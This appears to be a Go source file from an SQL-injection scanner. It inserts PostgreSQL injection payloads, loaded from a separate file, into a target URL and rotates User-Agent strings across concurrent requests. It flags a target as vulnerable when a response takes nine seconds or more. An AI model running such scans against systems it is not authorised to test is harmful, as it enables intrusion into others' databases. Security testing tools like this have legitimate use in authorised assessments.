package code

import (
	"MySqlMap/payload"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

func ScanUrl() {
	if len(os.Args) <= 2 {
		fmt.Println("Please use Command go run . -u https://examole.com?cat=1*")
		return
	}

	// Target URL to test
	targetURL := os.Args[2]
	dataUserAgents := DataUserAgent()
	countUserAgent := -1
	// Read payloads from file
	payloads := payload.Read("./payload/postgresql")
	// if err != nil {
	// 	fmt.Println("Error reading payloads from file:", err)
	// 	return
	// }

	// Wait group to synchronize goroutines
	var wg sync.WaitGroup

	// Iterate over each payload
	for _, node := range payloads {
		key, payload := node.Name, node.Payload
		wg.Add(1) // Increment the wait group counter

		countUserAgent++
		go func(keyValue, p, target string, userAgentIndex int) {
			defer wg.Done() // Decrement the wait group counter when the goroutine finishes
			p = strings.ReplaceAll(p, "5", "10")
			p = url.QueryEscape(p)
			// Send HTTP request with payload
			newUrl := strings.ReplaceAll(target, "*", p)
			req, err := http.NewRequest("GET", newUrl, nil)
			req.Header.Set("User-Agent", dataUserAgents[userAgentIndex%77])
			if err != nil {
				fmt.Println("Error Make Request")
				return
			}
			client := &http.Client{}
			startTime := time.Now()
			resp, err := client.Do(req)
			endTime := time.Now()
			if err != nil {
				fmt.Println("Error Send Request")
				return
			}
			// Check response time for potential blind SQL injection (time-based)
			elapsedTime := endTime.Sub(startTime)
			if elapsedTime >= time.Duration(9)*time.Second {
				fmt.Printf("%s(%s) %s %s vulnerable%s\n", ColorGreen+TextBold, resp.Status, p, keyValue, ColorReset)

			} else {
				fmt.Printf("%s(%s) failed!%s\n", ColorRed, resp.Status, ColorReset)
			}
			// Add more advanced checks as needed...
		}(key, payload, targetURL, countUserAgent) // Pass the payload to the anonymous function
	}

	wg.Wait() // Wait for all goroutines to finish before returning
}
